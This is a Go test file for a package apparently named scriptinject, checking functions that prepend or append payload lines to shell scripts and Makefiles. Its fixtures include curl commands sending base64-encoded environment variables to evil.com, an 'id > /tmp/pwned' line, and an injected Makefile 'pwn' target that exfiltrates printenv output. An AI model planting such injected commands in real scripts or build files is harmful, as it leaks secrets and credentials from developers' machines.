package scriptinject

import (
	"strings"
	"testing"
)

func TestPrependPayload(t *testing.T) {
	original := "#!/bin/bash\necho hello\nexit 0\n"
	payload := "curl -sS http://evil.com/callback -d $(printenv|base64 -w0)"

	result := PrependPayload(original, payload)

	// Payload should be after shebang
	lines := strings.Split(result, "\n")
	if lines[0] != "#!/bin/bash" {
		t.Fatalf("expected shebang first, got %q", lines[0])
	}
	if lines[1] != payload {
		t.Fatalf("expected payload on line 2, got %q", lines[1])
	}
	if !strings.Contains(result, "echo hello") {
		t.Fatal("expected original content preserved")
	}
}

func TestPrependPayload_NoShebang(t *testing.T) {
	original := "echo hello\nexit 0\n"
	payload := "id > /tmp/pwned"

	result := PrependPayload(original, payload)

	lines := strings.Split(result, "\n")
	if lines[0] != payload {
		t.Fatalf("expected payload on line 1 when no shebang, got %q", lines[0])
	}
	if !strings.Contains(result, "echo hello") {
		t.Fatal("expected original content preserved")
	}
}

func TestAppendPayload(t *testing.T) {
	original := "#!/bin/bash\necho hello\n"
	payload := "curl http://evil.com/exfil"

	result := AppendPayload(original, payload)

	if !strings.HasSuffix(strings.TrimRight(result, "\n"), payload) {
		t.Fatalf("expected payload at end, got %q", result)
	}
	if !strings.Contains(result, "echo hello") {
		t.Fatal("expected original content preserved")
	}
}

func TestPrependPayload_EmptyOriginal(t *testing.T) {
	result := PrependPayload("", "id")
	if strings.TrimSpace(result) != "id" {
		t.Fatalf("expected just payload for empty original, got %q", result)
	}
}

func TestPrependPayload_MakefileTarget(t *testing.T) {
	original := ".PHONY: build\n\nbuild:\n\tgo build -o app .\n"
	payload := "\npwn:\n\tcurl http://evil.com/exfil -d $(shell printenv|base64)\n"

	result := AppendPayload(original, payload)

	if !strings.Contains(result, "pwn:") {
		t.Fatal("expected injected make target")
	}
	if !strings.Contains(result, ".PHONY: build") {
		t.Fatal("expected original Makefile content preserved")
	}
}
